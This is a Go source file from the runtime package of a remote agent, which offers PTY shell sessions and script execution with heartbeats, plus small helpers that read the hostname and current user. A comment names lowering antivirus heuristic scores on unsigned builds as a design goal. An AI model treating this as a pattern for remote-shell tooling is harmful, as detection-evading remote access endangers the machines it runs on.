package runtime

import (
        "context"
        "os"
        "sync/atomic"
        "time"

        "core/cmd/agent/config"
        "core/cmd/agent/wire"
)

// Env is the per-session runtime context shared between handlers.
//
// CAPABILITY SURFACE (intentionally narrow):
//   - Console / shell sessions over PTY (runtime/console.go)
//   - Script execution (handlers/script_exec.go)
//   - Heartbeat (ping / pong)
//   - Disconnect signalling
//
// The agent has NO screen capture, NO input injection, NO file
// transfer, NO clipboard access, NO process control beyond the shell
// PTY, and NO display enumeration. Do not add fields for any of those
// here without explicit operator approval — the narrow capability
// surface is what keeps the binary small and lowers the AV heuristic
// score on unsigned builds.
type Env struct {
        Conn           wire.Writer
        Cfg            config.Config
        Cancel         context.CancelFunc
        Console        *ConsoleHub
        LastPongUnixMs int64
}

func (e *Env) SetLastPong(tsMillis int64) {
        if tsMillis <= 0 {
                tsMillis = time.Now().UnixMilli()
        }
        atomic.StoreInt64(&e.LastPongUnixMs, tsMillis)
}

func (e *Env) LastPong() time.Time {
        ms := atomic.LoadInt64(&e.LastPongUnixMs)
        if ms <= 0 {
                return time.Time{}
        }
        return time.UnixMilli(ms)
}

func Hostname() string {
        h, err := os.Hostname()
        if err != nil {
                return "unknown"
        }
        return h
}

func CurrentUser() string {
        if u := os.Getenv("USERNAME"); u != "" {
                return u
        }
        if u := os.Getenv("USER"); u != "" {
                return u
        }
        return "unknown"
}

func MinDuration(a, b time.Duration) time.Duration {
        if a < b {
                return a
        }
        return b
}
